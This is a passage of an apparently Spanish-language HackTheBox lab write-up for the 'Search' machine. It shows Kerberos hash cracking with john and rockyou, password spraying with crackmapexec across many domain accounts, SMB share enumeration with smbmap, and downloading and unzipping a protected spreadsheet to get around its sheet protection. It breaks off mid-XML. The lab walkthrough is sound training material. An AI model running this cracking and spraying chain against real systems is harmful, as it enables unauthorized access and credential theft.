fbe5a799aa3263c61fc0785337000be220dc05b71991f5ff470a9453e7412336fb11b1e9c42c7c888a04e3c57f786bdaa7905c49cea617c4e2c770918e2703c821620bff118f587d9e907ee99c36253a4181fb20b1bab49e5a5037450f6fce881f172fb54fd2ce6a5fc6f72825b7e0f3690918996b8599af819130aa4375065e00fa61b8c5a2cec01c43923ffab89909f39dea3d1e410cb4d8a05d778205fa99afaa61ffbfe0c00d54bab2486241dac57602941a26e40afc83ebb55d17453b4372b72e06161e946adecf8da</span>
+</code></pre></div></div>
+
+<ul>
+  <li>En caso de que no funcione el ataque necesitas estar sincronizado al reloj de la maquina.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ ntpdate 10.129.229.57
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora como tenemos el hash podemos crackearlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+0g 0:00:00:29 39.26% <span class="o">(</span>ETA: 16:38:09<span class="o">)</span> 0g/s 198514p/s 198514c/s 198514C/s marsters62..marshmallow4646
+@3ONEmillionbaby <span class="o">(</span>?<span class="o">)</span>
+1g 0:00:00:54 DONE <span class="o">(</span>2024-04-07 16:37<span class="o">)</span> 0.01835g/s 210937p/s 210937c/s 210937C/s @421eduymayte619..@123abc@
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a validar que la contraseña es correcta.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb search.htb <span class="nt">-u</span> web_svc <span class="nt">-p</span> @3ONEmillionbaby
+SMB         search.htb      445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\w</span>eb_svc:@3ONEmillionbaby
+</code></pre></div></div>
+
+<h2 id="edgarjacobs">edgar.jacobs</h2>
+
+<ul>
+  <li>Como tenemos muchos usuarios podemos probar un ataque de fuerza bruta para ver si otros usuarios reutilizan la misma contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb search.htb <span class="nt">-u</span> all.txt <span class="nt">-p</span> @3ONEmillionbaby <span class="nt">--continue-on-success</span>
+➜  content crackmapexec smb search.htb <span class="nt">-u</span> all.txt <span class="nt">-p</span> @3ONEmillionbaby <span class="nt">--continue-on-success</span>
+SMB         search.htb      445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>dministrator:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\G</span>uest:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\k</span>rbtgt:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>antino.Benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\P</span>ayton.Harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\T</span>race.Ryan:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\R</span>eginald.Morton:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>ddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>ortez.Hickman:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>hace.Oneill:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>bril.Suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>avanah.Velazquez:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>ntony.Russo:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>ameron.Melendez:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>dith.Walls:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\L</span>ane.Wu:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>rielle.Schultz:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\B</span>obby.Wolf:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\B</span>laine.Zavala:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>argaret.Robinson:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>elia.Moreno:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\K</span>aitlynn.Lee:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\K</span>yler.Arias:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>aniyah.Roy:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>arai.Boone:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>ermaine.Franco:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>lfred.Chan:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>amar.Holt:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>andra.Wolfe:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\R</span>ene.Larson:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\Y</span>areli.Mcintyre:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\G</span>riffin.Maddox:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\P</span>rince.Hobbs:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>rmando.Nash:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>onia.Schneider:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>aeve.Mann:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\L</span>izeth.Love:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>mare.Serrano:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>avanah.Knox:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\F</span>rederick.Cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>arshall.Skinner:@3ONEmillionbaby STATUS_LOGON_FAILURE
+SMB         search.htb      445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\E</span>dgar.Jacobs:@3ONEmillionbaby
+^C
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Y bueno el usuario <code class="language-plaintext highlighter-rouge">Edgar.Jacobs</code> reutiliza la misma contraseña.</p>
+  </li>
+  <li>
+    <p>Vamos a listar los recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code> para el usuario <code class="language-plaintext highlighter-rouge">Edgar.Jacobs</code>.</p>
+  </li>
+  <li>
+    <p>Vemos el <code class="language-plaintext highlighter-rouge">RedirectedFolders$</code> otra vez.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
+	helpdesk                                          	READ ONLY	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
+	SYSVOL                                            	READ ONLY	Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a ver lo que hay dentro.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
+	helpdesk                                          	READ ONLY	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
+	./RedirectedFolders<span class="err">$</span>
+	dr--r--r--                0 Sun Apr  7 16:59:18 2024	<span class="nb">.</span>
+	dr--r--r--                0 Sun Apr  7 16:59:18 2024	..
+	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
+	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
+	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
+	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
+	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
+	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
+	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
+	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
+	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
+	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
+	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
+	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
+	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
+	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
+	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
+	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
+	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
+	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
+	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
+	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
+	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
+	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
+	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
+	SYSVOL                                            	READ ONLY	Logon server share
+➜  content
+</code></pre></div></div>
+
+<ul>
+  <li>Si nos metemos a nuestro directorio vemos que esta el <code class="language-plaintext highlighter-rouge">Desktop</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/edgar.jacobs/'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
+	helpdesk                                          	READ ONLY	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
+	./RedirectedFolders<span class="nv">$edgar</span>.jacobs/
+	dr--r--r--                0 Thu Apr  9 15:04:11 2020	<span class="nb">.</span>
+	dr--r--r--                0 Thu Apr  9 15:04:11 2020	..
+	dw--w--w--                0 Mon Aug 10 05:02:16 2020	Desktop
+	dw--w--w--                0 Mon Aug 10 05:02:17 2020	Documents
+	dw--w--w--                0 Mon Aug 10 05:02:17 2020	Downloads
+	SYSVOL                                            	READ ONLY	Logon server share
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno vemos un <code class="language-plaintext highlighter-rouge">xlsx</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/edgar.jacobs/Desktop'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
+	helpdesk                                          	READ ONLY	
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
+	./RedirectedFolders<span class="nv">$edgar</span>.jacobs/Desktop
+	dw--w--w--                0 Mon Aug 10 05:02:16 2020	<span class="nb">.</span>
+	dw--w--w--                0 Mon Aug 10 05:02:16 2020	..
+	dr--r--r--                0 Thu Apr  9 15:05:29 2020	<span class="nv">$RECYCLE</span>.BIN
+	fr--r--r--              282 Mon Aug 10 05:02:16 2020	desktop.ini
+	fr--r--r--             1450 Thu Apr  9 15:05:03 2020	Microsoft Edge.lnk
+	fr--r--r--            23130 Mon Aug 10 05:30:05 2020	Phishing_Attempt.xlsx
+	SYSVOL                                            	READ ONLY	Logon server share
+</code></pre></div></div>
+
+<blockquote>
+  <p>xlsx. Formato de archivo basado en XML y habilitado para macros de Excel 2007 a 2013. Almacena código de macros de VBA u hojas de macros de Excel 4.0 .</p>
+</blockquote>
+
+<ul>
+  <li>Vamos a descargarlo para ver que es lo que hay dentro.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/edgar.jacobs/Desktop/Phishing_Attempt.xlsx'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
+<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>edgar.jacobs<span class="se">\D</span>esktop<span class="se">\P</span>hishing_Attempt.xlsx <span class="o">(</span>23130 bytes<span class="o">)</span>
+<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/document/10.129.229.57-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos abrirlo con <code class="language-plaintext highlighter-rouge">libreoffice</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/7.png" />
+</p>
+
+<ul>
+  <li>Vemos que la parte de <code class="language-plaintext highlighter-rouge">Passwords</code> esta protegida.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/search/8.png" />
+</p>
+
+<ul>
+  <li>Vamos aplicar un <code class="language-plaintext highlighter-rouge">Bypass</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document unzip Phishing_Attempt.xlsx
+Archive:  Phishing_Attempt.xlsx
+  inflating: <span class="o">[</span>Content_Types].xml
+  inflating: _rels/.rels
+  inflating: xl/workbook.xml
+  inflating: xl/_rels/workbook.xml.rels
+  inflating: xl/worksheets/sheet1.xml
+  inflating: xl/worksheets/sheet2.xml
+  inflating: xl/theme/theme1.xml
+  inflating: xl/styles.xml
+  inflating: xl/sharedStrings.xml
+  inflating: xl/drawings/drawing1.xml
+  inflating: xl/charts/chart1.xml
+  inflating: xl/charts/style1.xml
+  inflating: xl/charts/colors1.xml
+  inflating: xl/worksheets/_rels/sheet1.xml.rels
+  inflating: xl/worksheets/_rels/sheet2.xml.rels
+  inflating: xl/drawings/_rels/drawing1.xml.rels
+  inflating: xl/charts/_rels/chart1.xml.rels
+  inflating: xl/printerSettings/printerSettings1.bin
+  inflating: xl/printerSettings/printerSettings2.bin
+  inflating: xl/calcChain.xml
+  inflating: docProps/core.xml
+  inflating: docProps/app.xml
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que <code class="language-plaintext highlighter-rouge">hashValue</code> y mas detalles del archivo protegido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document <span class="nb">cat </span>xl/worksheets/sheet2.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span>?&gt;
+&lt;worksheet <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/spreadsheetml/2006/main"</span> xmlns:r<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span> xmlns:mc<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span> mc:Ignorable<span class="o">=</span><span class="s2">"x14ac xr xr2 xr3"</span> xmlns:x14ac<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac"</span> xmlns:xr<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2014/revision"</span> xmlns:xr2<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2015/revision2"</span> xmlns:xr3<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2016/revision3"</span> xr:uid<span class="o">=</span><span class="s2">"{00000000-0001-0000-0100-000000000000}"</span><span class="o">&gt;</span>&lt;dimension <span class="nv">ref</span><span class="o">=</span><span class="s2">"A1:D17"</span>/&gt;&lt;sheetViews&gt;&lt;sheetView <span class="nv">tabSelected</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">workbookViewId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>&lt;selection <span class="nv">activeCell</span><span class="o">=</span><span class="s2">"F19"</span> <span class="nv">sqref</span><span class="o">=</span><span class="s2">"F19"</span>/&gt;&lt;/sheetView&gt;&lt;/sheetViews&gt;&lt;sheetFormatPr <span class="nv">defaultRowHeight</span><span class="o">=</span><span class="s2">"15"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span>/&gt;&lt;cols&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"10.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"37.5703125"</span> <span class="nv">hidden</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"19.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;/cols&gt;&lt;sheetData&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;0&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;1&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;2&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;31&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;3&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;4&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;44&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D2:D7"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>A2&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B2&lt;/f&gt;&lt;v&gt;Payton.Harmon&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;5&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;6&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;45&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Cortez.Hickman&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span 